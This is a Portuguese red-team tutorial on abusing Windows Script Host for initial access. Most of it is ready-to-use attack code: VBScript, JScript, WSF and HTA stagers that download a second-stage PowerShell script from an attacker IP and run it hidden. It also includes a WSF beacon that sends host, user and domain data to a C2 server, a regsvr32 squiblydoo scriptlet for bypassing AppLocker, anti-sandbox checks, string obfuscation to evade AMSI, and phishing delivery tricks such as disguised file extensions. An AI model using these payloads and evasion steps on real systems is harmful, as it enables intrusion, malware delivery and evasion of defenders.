---
layout: cyber
section: acesso-inicial
title: "Windows Script Host (WSH) para Red Team"
---

# Windows Script Host (WSH) para Red Team

## Living Off the Land na Forma Mais Pura

WSH é nativo em todas as versões do Windows desde Windows 98. O operador não precisa dropar binário adicional — VBScript e JScript executam por padrão em qualquer máquina Windows corporativa. Isso é Living off the Land (LotL) na forma mais pura.

WSH cobre quatro frentes em red team: entrega via phishing (.vbs, .js, .wsf são enviados como attachment), bypass de AppLocker (regsvr32 squiblydoo bypassa sem dropar executável), execução em memória (JScript baixa e executa .NET assembly sem tocar disco), e ausência de dependência (funciona onde PowerShell está restrito). Pra CRTO I aparece como vetor de entrega inicial; pra OSEP combina com técnicas de execução em memória (DotNetToJScript, PPID spoofing).

---

## wscript vs cscript vs LOLBins

### wscript.exe vs cscript.exe

Ambos executam scripts VBScript e JScript. A diferença é o modo de output:

**wscript.exe** — Windows Script Host (GUI):
- Output vai para popups de dialog box
- Ideal para execução silenciosa (sem janela de console visível)
- Padrão ao dar double-click em .vbs/.js no Explorer

**cscript.exe** — Console Script Host:
- Output vai para stdout/stderr (console)
- Ideal para debugging e para scripts que precisam de output em automação

```cmd
REM Executar VBScript em modo GUI (sem console)
wscript.exe payload.vbs

REM Executar VBScript no console
cscript.exe payload.vbs

REM Especificar linguagem explicitamente
wscript.exe /e:VBScript payload.vbs
wscript.exe /e:JScript payload.js

REM Executar com timeout (em segundos)
wscript.exe /t:30 payload.vbs

REM Suprimir output de erros (silent)
wscript.exe //nologo //b payload.vbs
```

Para uso em red team, `wscript.exe` é preferível pois não cria janela de console visível para o usuário.

---

### VBScript para Red Team

VBScript é uma linguagem interpretada com acesso completo ao modelo COM do Windows. Os objetos mais úteis:

#### WScript.Shell — Execução de Comandos

```vbscript
' Objeto mais importante para execução
Dim objShell
Set objShell = CreateObject("WScript.Shell")

' Run: executa processo, segundo arg = window style (0=hidden), terceiro = aguardar
' Window Style: 0=hidden, 1=normal, 2=minimized
objShell.Run "cmd.exe /c whoami > C:\temp\out.txt", 0, False

' False = não aguardar conclusão (async)
' True = aguardar conclusão e retornar exit code

' Exec: capturar output (retorna objeto StdOut)
Dim objExec
Set objExec = objShell.Exec("cmd.exe /c whoami")
Dim strOutput
strOutput = objExec.StdOut.ReadAll()
WScript.Echo strOutput

' Registry: ler e escrever
objShell.RegWrite "HKCU\Software\Policies\Test", "valor", "REG_SZ"
Dim regVal
regVal = objShell.RegRead("HKCU\Software\Policies\Test")

' Environment variables
Dim objEnv
Set objEnv = objShell.Environment("Process")
WScript.Echo objEnv("TEMP")
WScript.Echo objEnv("USERPROFILE")
```

#### Scripting.FileSystemObject — Operações de Arquivo

```vbscript
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")

' Ler arquivo
Dim objFile
Set objFile = fso.OpenTextFile("C:\Windows\System32\drivers\etc\hosts", 1)
Dim content
content = objFile.ReadAll()
objFile.Close

' Escrever arquivo
Dim objWrite
Set objWrite = fso.CreateTextFile("C:\temp\payload.ps1", True)
objWrite.WriteLine "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.1',443)"
objWrite.Close

' Verificar se arquivo existe
If fso.FileExists("C:\temp\file.txt") Then
    WScript.Echo "Existe"
End If

' Listar arquivos em diretório
Dim objFolder
Set objFolder = fso.GetFolder("C:\Users")
Dim objSubFolder
For Each objSubFolder In objFolder.SubFolders
    WScript.Echo objSubFolder.Name
Next
```

#### MSXML2.XMLHTTP — HTTP Requests

```vbscript
' Download de payload via HTTP
Function DownloadPayload(url)
    Dim http
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    DownloadPayload = http.responseBody
End Function

' Uso básico
Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://10.10.10.1/payload.ps1", False
http.setRequestHeader "User-Agent", "Mozilla/5.0"
http.Send

Dim content
content = http.responseText

' Alternativa: MSXML2.ServerXMLHTTP (melhor para HTTPS)
Dim httpsObj
Set httpsObj = CreateObject("MSXML2.ServerXMLHTTP")
httpsObj.Open "GET", "https://c2.domain.com/stage", False
httpsObj.Send
Dim response
response = httpsObj.responseText
```

#### WScript.Sleep — Delays Anti-Sandbox

```vbscript
' Sleep em milissegundos
' Sandboxes geralmente têm timeout curto (30-90 segundos)
' Sleep de 10 minutos (600000ms) evita detecção em sandbox automático
WScript.Sleep 600000

' Técnica melhor: verificar hora atual
Dim startTime
startTime = Now()
Do While (Now() - startTime) * 86400 < 600  ' aguardar 600 segundos
    WScript.Sleep 5000  ' checkar a cada 5s
Loop

' Verificar se está em VM (checar processos típicos de sandbox)
Dim objWMI
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
Dim colProcesses
Set colProcesses = objWMI.ExecQuery("SELECT Name FROM Win32_Process WHERE Name = 'vboxservice.exe' OR Name = 'vmtoolsd.exe' OR Name = 'vmsrvc.exe'")
If colProcesses.Count > 0 Then
    WScript.Quit  ' Em VM, encerrar silenciosamente
End If
```

#### Payload VBScript Completo — Download e Execução

```vbscript
' payload.vbs — Download e execução em memória via PowerShell
' Evitar: criação de arquivo em disco (usar -EncodedCommand)
Option Explicit

Dim objShell, objHTTP, strURL, strCmd

' URL do payload PowerShell
strURL = "http://10.10.10.1/stage2.ps1"

' Baixar conteúdo
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", strURL, False
objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
objHTTP.Send

Dim strPS1
strPS1 = objHTTP.responseText
Set objHTTP = Nothing

' Encodar em Base64 para -EncodedCommand
' (Nota: PowerShell espera UTF-16LE)
Dim objStream
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 2  ' text
objStream.Charset = "UTF-16LE"
objStream.Open
objStream.WriteText strPS1
objStream.Position = 0
objStream.Type = 1  ' binary
Dim rawBytes
rawBytes = objStream.Read()
objStream.Close

' Converter para Base64 (sem os 2 primeiros bytes BOM)
Dim objXML
Set objXML = CreateObject("Microsoft.XMLDOM")
Dim objNode
Set objNode = objXML.createElement("b64")
objNode.dataType = "bin.base64"
objNode.nodeTypedValue = Mid(rawBytes, 3)  ' pular BOM
Dim strB64
strB64 = Replace(Replace(objNode.Text, Chr(10), ""), Chr(13), "")

' Executar PowerShell com payload encodado
Set objShell = CreateObject("WScript.Shell")
strCmd = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand " & strB64
objShell.Run strCmd, 0, False
```

---

### JScript para Red Team

JScript é o equivalente JavaScript do Windows Script Host. Sintaxe similar a JavaScript, mas com acesso aos mesmos objetos COM que o VBScript.

#### Execução Básica em JScript

```javascript
// payload.js
var objShell = new ActiveXObject("WScript.Shell");
var objHTTP = new ActiveXObject("MSXML2.XMLHTTP");
var objFSO = new ActiveXObject("Scripting.FileSystemObject");

// Execução de comando (sem janela visível)
objShell.Run("cmd.exe /c whoami > C:\\temp\\out.txt", 0, false);

// Alternativa: usar PowerShell direto
objShell.Run("powershell.exe -ep bypass -w hidden -c \"IEX(IWR 'http://10.10.10.1/ps.ps1')\"", 0, false);
```

#### Download e Execução em Memória via JScript

```javascript
// download-exec.js — download e execução sem escrever arquivo em disco
var url = "http://10.10.10.1/shellcode.b64";
var shell = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("MSXML2.XMLHTTP");

// Download
http.Open("GET", url, false);
http.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
http.Send();
var payload = http.responseText.replace(/\s/g, "");

// Montar comando PowerShell que executa o payload em memória
// Payload é um script PS1 encodado em base64
var cmd = "powershell.exe -NonInteractive -WindowStyle Hidden -ep bypass " +
          "-EncodedCommand " + payload;

shell.Run(cmd, 0, false);
```

#### Checar Ambiente (Anti-Sandbox/Anti-Analysis)

```javascript
// anti-analysis.js
var shell = new ActiveXObject("WScript.Shell");
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");

// Verificar número de processos (sandbox tem poucos)
var procs = wmi.ExecQuery("SELECT * FROM Win32_Process");
var count = 0;
var e = new Enumerator(procs);
for (; !e.atEnd(); e.moveNext()) { count++; }
if (count < 30) { WScript.Quit(); }

// Verificar RAM (sandbox frequentemente tem menos de 2GB)
var comps = wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
e = new Enumerator(comps);
if (!e.atEnd()) {
    var mem = parseInt(e.item().TotalPhysicalMemory);
    if (mem < 2147483648) { WScript.Quit(); }  // menos de 2GB
}

// Verificar resolução de tela (sandbox frequentemente usa baixa resolução)
var desktops = wmi.ExecQuery("SELECT CurrentHorizontalResolution FROM Win32_VideoController");
e = new Enumerator(desktops);
if (!e.atEnd()) {
    var resH = parseInt(e.item().CurrentHorizontalResolution);
    if (resH < 1024) { WScript.Quit(); }
}

// Se passou em todas as checagens, executar payload
shell.Run("powershell.exe -ep bypass -w hidden -c IEX(IWR('http://10.10.10.1/stage2.ps1'))", 0, false);
```

#### Ofuscação de Strings em JScript

```javascript
// Ofuscação via concatenação de strings
var objName = "WS" + "cri" + "pt." + "She" + "ll";
var shell = new ActiveXObject(objName);

// Ofuscação via array join
var parts = ["power", "shell", ".exe"];
var binary = parts.join("");
shell.Run(binary + " -ep bypass -w hidden", 0, false);

// Usando variáveis intermediárias para fragmentar strings suspeitas
var a = "MSXML", b = "2.", c = "XMLHTTP";
var httpObj = new ActiveXObject(a + b + c);

// Decode de string encodada em charCodes (substituto ao uso de eval)
var codes = [112, 111, 119, 101, 114, 115, 104, 101, 108, 108];
var decoded = "";
for (var i = 0; i < codes.length; i++) {
    decoded += String.fromCharCode(codes[i]);
}
// decoded = "powershell"
shell.Run(decoded + ".exe -ep bypass -w hidden", 0, false);
```

---

### WSF — Windows Script File

WSF permite combinar múltiplos scripts (VBScript e JScript) em um único arquivo XML. Util para payloads mais complexos e para misturar linguagens.

```xml
<?xml version="1.0" ?>
<!-- payload.wsf -->
<package>
  <job id="recon">
    <script language="VBScript">
      ' Reconhecimento com VBScript
      Dim objShell, objWMI, strInfo
      Set objShell = CreateObject("WScript.Shell")
      Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
      
      ' Coletar informações do sistema
      Dim compQuery
      Set compQuery = objWMI.ExecQuery("SELECT * FROM Win32_ComputerSystem")
      Dim comp
      For Each comp In compQuery
          strInfo = strInfo & "Host: " & comp.Name & Chr(10)
          strInfo = strInfo & "Domain: " & comp.Domain & Chr(10)
          strInfo = strInfo & "User: " & comp.UserName & Chr(10)
      Next
    </script>
    
    <script language="JScript">
      // Parte JScript: enviar informações para C2
      var http = new ActiveXObject("MSXML2.XMLHTTP");
      var shell = new ActiveXObject("WScript.Shell");
      var env = shell.Environment("Process");
      
      var data = "host=" + env("COMPUTERNAME") + 
                 "&user=" + env("USERNAME") + 
                 "&domain=" + env("USERDOMAIN");
      
      http.Open("POST", "http://10.10.10.1/beacon", false);
      http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      http.setRequestHeader("User-Agent", "Mozilla/5.0");
      http.Send(data);
    </script>
  </job>
  
  <job id="payload">
    <script language="VBScript">
      ' Executar payload principal
      Dim objShell
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "powershell.exe -ep bypass -w hidden -c IEX(IWR('http://10.10.10.1/stage2.ps1'))", 0, False
    </script>
  </job>
</package>
```

Executar jobs específicos de um WSF:
```cmd
wscript.exe payload.wsf //job:recon
wscript.exe payload.wsf //job:payload
```

---

### DotNetToJScript

DotNetToJScript é uma técnica que permite executar um .NET assembly (C#) via JScript, sem dropar nenhum arquivo .NET em disco. A ferramenta (de James Forshaw) gera um JScript que cria um CustomMarshal para instanciar a classe .NET.

```
Fluxo DotNetToJScript:

1. Você tem um payload em C# (ex: shellcode loader)
2. Compila como .NET assembly (.dll ou .exe)
3. Passa para a ferramenta: DotNetToJScript.exe payload.dll --ver v4 --lang JScript -o output.js
4. A ferramenta gera um .js que:
   a. Usa BinaryFormatter para deserializar o assembly
   b. Usa TypeConfuseDelegateHelper para instanciar a classe
   c. Tudo via COM interop, sem LoadLibrary, sem arquivo em disco
5. Executar: wscript.exe output.js
```

```cmd
REM Compilar payload C# como DLL
csc.exe /target:library /out:payload.dll payload.cs

REM Gerar JScript
DotNetToJScript.exe payload.dll --ver v4 --lang JScript -o output.js

REM Gerar VBScript
DotNetToJScript.exe payload.dll --ver v4 --lang VBScript -o output.vbs

REM Executar
wscript.exe output.js
```

**Por que é relevante:** DotNetToJScript era muito útil para bypass de application whitelisting. Hoje, versões modernas do Windows e EDRs detectam os padrões de serialização BinaryFormatter. Mas a técnica base (usar COM interop para carregar .NET) ainda é usada em variações (GadgetToJScript, etc.).

---

### regsvr32 — Squiblydoo (AppLocker Bypass)

**Técnica:** `regsvr32` é um binário signed da Microsoft que pode registrar COM objects. A flag `/i` aceita uma URL e baixa um arquivo `.sct` (scriptlet). `.sct` é XML com JScript embutido. O COM scriptlet executa sem necessidade de admin, sem arquivo em disco, e bypassando AppLocker.

```cmd
REM Sintaxe básica do squiblydoo:
regsvr32.exe /s /n /u /i:http://10.10.10.1/payload.sct scrobj.dll

REM Flags:
REM /s = silencioso (sem dialogs de registro)
REM /n = não chamar DllRegisterServer
REM /u = unregister (mas com /i, baixa e executa o scriptlet)
REM /i:<URL> = URL do scriptlet a baixar e executar
REM scrobj.dll = DLL de COM scripting objects (sempre presente no Windows)

REM Variação local (sem URL):
regsvr32.exe /s /n /u /i:C:\path\to\payload.sct scrobj.dll
```

**Arquivo .sct (scriptlet) — estrutura:**

```xml
<?XML version="1.0"?>
<!-- payload.sct — COM Scriptlet -->
<scriptlet>
<registration
    progid="PayloadTest"
    classid="{DEADBEEF-1234-5678-ABCD-EF0123456789}">
    
    <!-- Este script executa quando regsvr32 processa o scriptlet -->
    <script language="JScript">
        <![CDATA[
            // Código JScript que executa no contexto do regsvr32
            var shell = new ActiveXObject("WScript.Shell");
            
            // Execução de payload via PowerShell
            var psCmd = "powershell.exe -ep bypass -w hidden -c " +
                        "\"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.1/stage2.ps1')\"";
            shell.Run(psCmd, 0, false);
        ]]>
    </script>
</registration>
</scriptlet>
```

**Por que bypassa AppLocker:**
- `regsvr32.exe` está na lista de executáveis confiáveis do AppLocker por padrão (LOLBIN)
- A execução do scriptlet acontece dentro do contexto do `regsvr32.exe` — binário Microsoft assinado
- AppLocker não inspeciona o conteúdo do scriptlet baixado remotamente
- O scriptlet executa antes de ser salvo em disco (streaming)

**Limitações:** Windows Defender e muitos EDRs detectam este padrão hoje. Útil em ambientes com EDR fraco ou quando AppLocker é a única defesa, ou em combinação com obfuscação do scriptlet.

---

### mshta.exe — HTA Files

`mshta.exe` é o Microsoft HTML Application Host. Executa arquivos `.hta` que podem conter VBScript ou JScript com acesso full ao sistema (não sandboxado como browser).

```cmd
REM Executar HTA local
mshta.exe payload.hta

REM Executar HTA remoto (mais comum em red team)
mshta.exe http://10.10.10.1/payload.hta

REM Executar inline VBScript (sem arquivo)
mshta.exe vbscript:CreateObject("WScript.Shell").Run("cmd.exe /c whoami",0,True)(window.close)

REM Executar inline JScript (URL-encoded)
mshta.exe javascript:new%20ActiveXObject('WScript.Shell').Run('cmd%20/c%20whoami',0,true);close()
```

**Arquivo HTA completo:**

```html
<!-- payload.hta -->
<html>
<head>
<title>Update Required</title>
<hta:application
    applicationname="Update"
    id="oHTA"
    version="1.0"
    border="none"
    windowstate="minimize"
    showintaskbar="no"
    singleinstance="yes"
    sysmenu="no"
/>
<script language="VBScript">
    Sub Window_onLoad()
        ' Executar silenciosamente quando a janela abre
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")
        
        ' Download e execução do stage 2
        Dim http
        Set http = CreateObject("MSXML2.XMLHTTP")
        http.Open "GET", "http://10.10.10.1/stage2.ps1", False
        http.Send
        
        Dim ps1content
        ps1content = http.responseText
        
        ' Escrever temporariamente e executar
        Dim fso, tmpPath
        Set fso = CreateObject("Scripting.FileSystemObject")
        tmpPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost32.ps1"
        
        Dim f
        Set f = fso.CreateTextFile(tmpPath, True)
        f.Write ps1content
        f.Close
        
        objShell.Run "powershell.exe -ep bypass -w hidden -f " & tmpPath, 0, True
        
        ' Limpar arquivo temporário
        fso.DeleteFile tmpPath
        
        ' Fechar a janela HTA
        Self.Close
    End Sub
</script>
</head>
<body>
<p>Please wait while your update installs...</p>
</body>
</html>
```

**HTA mais OPSEC — execução em memória via EncodedCommand:**

```html
<!-- payload-mem.hta — sem escrever PS1 em disco -->
<html>
<head>
<title> </title>
<hta:application windowstate="minimize" showintaskbar="no" sysmenu="no" border="none"/>
<script language="VBScript">
    Sub Window_onLoad()
        Dim http, ps1, stream, xmlNode, xmlDoc, b64, shell
        
        ' Download do script PowerShell
        Set http = CreateObject("MSXML2.XMLHTTP")
        http.Open "GET", "http://10.10.10.1/stage2.ps1", False
        http.Send
        ps1 = http.responseText
        
        ' Converter para UTF-16LE (formato esperado pelo PS -EncodedCommand)
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 2
        stream.Charset = "UTF-16LE"
        stream.Open
        stream.WriteText ps1
        stream.Position = 0
        stream.Type = 1
        Dim rawBytes
        rawBytes = stream.Read()
        stream.Close
        
        ' Base64 encode (pular BOM de 2 bytes)
        Set xmlDoc = CreateObject("Microsoft.XMLDOM")
        Set xmlNode = xmlDoc.createElement("b64")
        xmlNode.dataType = "bin.base64"
        xmlNode.nodeTypedValue = Mid(rawBytes, 3)
        b64 = Replace(Replace(xmlNode.Text, Chr(10), ""), Chr(13), "")
        
        ' Executar sem arquivo em disco
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand " & b64, 0, False
        
        Self.Close
    End Sub
</script>
</head>
<body></body>
</html>
```

**Características do mshta:**
- Não requer elevação
- Processo filho de `mshta.exe` — detecção por parent process (PPID spoofing pode ajudar)
- Pode acessar internet diretamente (em alguns configs, bypassa proxy)
- Arquivos HTA recebidos via browser têm Mark of the Web (Zone.Identifier ADS)
- Via email/SMB, frequentemente sem MOTW — útil para bypass de SmartScreen

---

## Detecção e OPSEC

### O Que o Blue Team Detecta

| Vetor | Detecção | Contrameddida |
|---|---|---|
| wscript.exe fazendo HTTP | Sysmon Event 3 (network connection) | Usar PowerShell via wscript como intermediário |
| mshta.exe com URL | Sysmon Event 1 (command line) + Event 3 | Entregar HTA via arquivo local (não URL direta) |
| regsvr32 + scrobj.dll + /i: URL | Sysmon Event 1 com padrão squiblydoo | Difícil — padrão muito assinado em EDRs modernos |
| Script com COM object string | AMSI inspeciona scripts | Ofuscar strings de COM object via concatenação |
| Script baixando da internet | Proxy logs + Sysmon Event 3 | C2 com domínio categorizado + User-Agent customizado |
| .vbs/.js como attachment | Email gateway quarentena | Zipar com senha, ou usar macro em documento |
| WScript.Shell + cmd.exe | Process chain: wscript→cmd | Executar direto sem cmd (objShell.Run "powershell") |
| HTA via mshta | MOTW + SmartScreen | Entrega via compartilhamento de rede sem MOTW |

### Detecções Específicas — Event IDs

```
Sysmon Event ID 1 (Process Creation):
  - ParentImage: wscript.exe / cscript.exe
  - Image: powershell.exe / cmd.exe
  → Alerta: Script Host gerando processo filho suspeito

Sysmon Event ID 3 (Network Connection):
  - Image: wscript.exe / cscript.exe / mshta.exe
  - DestinationPort: 80 / 443
  → Alerta: Script Host fazendo conexão de rede

Sysmon Event ID 11 (File Create):
  - TargetFilename: *.ps1 em TEMP criado por wscript.exe
  → Alerta: Script Host criando arquivo PS1

Windows Event ID 4688 (Process Creation com command line logging):
  - Verificar: regsvr32 /s /n /u /i: (squiblydoo)
  - Verificar: mshta.exe http://

AMSI (Anti-Malware Scan Interface):
  - Scripts JScript/VBScript passam pelo AMSI em Windows 10+
  - Strings como "WScript.Shell" são inspecionadas em contexto
  - Bypass: ofuscação via concatenação, charcode decode, variáveis intermediárias

Microsoft Defender ASR (Attack Surface Reduction):
  - Regra: Block execution of potentially obfuscated scripts
  - Regra: Block JavaScript or VBScript from launching downloaded content
  - Regra: Block Win32 API calls from Office macros
```

### Técnicas de Ofuscação para WSH

```vbscript
' VBScript: ofuscação de strings via concatenação
Dim strObj
strObj = "WScri" & "pt." & "She" & "ll"
Set objShell = CreateObject(strObj)

' Usar Chr() para caracteres sensíveis (bypassa assinaturas de string)
Dim strProgramName
strProgramName = Chr(99) & Chr(109) & Chr(100)  ' "cmd"
objShell.Run strProgramName, 0, False

' Variável intermediária para fragmentar command suspeito
Dim p1, p2, p3, p4
p1 = "power"
p2 = "shell"
p3 = ".exe -"
p4 = "ep bypass"
objShell.Run p1 & p2 & p3 & p4, 0, False

' String reversa
Function RevStr(s)
    Dim i, r
    For i = Len(s) To 1 Step -1
        r = r & Mid(s, i, 1)
    Next
    RevStr = r
End Function

Dim objName
objName = RevStr("llehS.tpircSW")  ' "WScript.Shell" revertido
Set objShell = CreateObject(objName)
```

```javascript
// JScript: ofuscação via concatenação de array
var objName = ["WS","cri","pt.",["She","ll"].join("")].join("");
var shell = new ActiveXObject(objName);

// Ofuscação via charcode (substituto seguro ao eval para strings)
var codes = [112, 111, 119, 101, 114, 115, 104, 101, 108, 108];
var binaryName = "";
for (var i = 0; i < codes.length; i++) {
    binaryName += String.fromCharCode(codes[i]);
}
// binaryName = "powershell"
shell.Run(binaryName + ".exe -ep bypass -w hidden", 0, false);

// Split e join para quebrar assinatura
var suspect = ["cmd", ".exe", " /c", " who", "ami"].join("");
shell.Run(suspect, 0, false);
```

### Checklist OPSEC para WSH

```
Delivery:
□ Não enviar .vbs/.js como attachment sem proteção adicional
  → Zipar com senha, usar .wsf embutido em documento Office
□ Testar em múltiplos AV/EDR antes do engagement
□ Verificar que gateway de email não quarentena o tipo de arquivo
□ Usar extensão confusa: "Document.pdf.vbs" renomeado para "Document.pdf"
  (usuário vê apenas "Document.pdf" se extensões ocultas)

Execution:
□ Usar wscript (não cscript) para evitar janela de console visível
□ //nologo //b para suprimir headers de erro
□ Anti-sandbox: verificar processo count, RAM, resolução de tela
□ Sleep antes de executar (anti-sandbox com timeout curto)
□ Verificar User-Agent do MSXML2.XMLHTTP — usar User-Agent de browser real

Network:
□ Todas as conexões de rede devem ir para domínio categorizado
□ MSXML2.XMLHTTP respeita proxy corporativo automaticamente — ok
□ User-Agent padrão do XMLHTTP é identificável — sempre customizar

Process:
□ Evitar cmd.exe como filho do wscript (cadeia detectável)
□ Preferir: wscript → powershell diretamente (sem cmd)
□ Considerar PPID spoofing para processo PowerShell gerado
□ Mshta: entregar via compartilhamento SMB para evitar MOTW
```

---

## Módulos Relacionados

`01_phishing_e_engenharia_social.md` cobre entrega de scripts WSH via phishing. `02_office_vba_macros.md` é a alternativa via documentos Office. `01_fundamentos/04_malware_essentials.md` contextualiza staged vs stageless (WSH como stager). `04_evasao/04_applocker_bypass.md` aprofunda squiblydoo e técnicas correlatas. `04_evasao/01_av_evasao_introducao.md` cobre ofuscação de script pra evadir AMSI/AV. `02_c2_infraestrutura/02_listeners_e_payloads.md` define o stage 2 que o WSH baixa.

---

## Leitura Complementar

- LOLBAS Project — https://lolbas-project.github.io/
- DotNetToJScript — https://github.com/tyranid/DotNetToJScript
- GadgetToJScript — https://github.com/med0x2e/GadgetToJScript
- Casey Smith — Squiblydoo — https://subt0x10.blogspot.com/
- MITRE ATT&CK T1059.005 (Visual Basic), T1059.007 (JavaScript), T1218.010 (Regsvr32), T1218.005 (Mshta), T1218 (Signed Binary Proxy Execution)
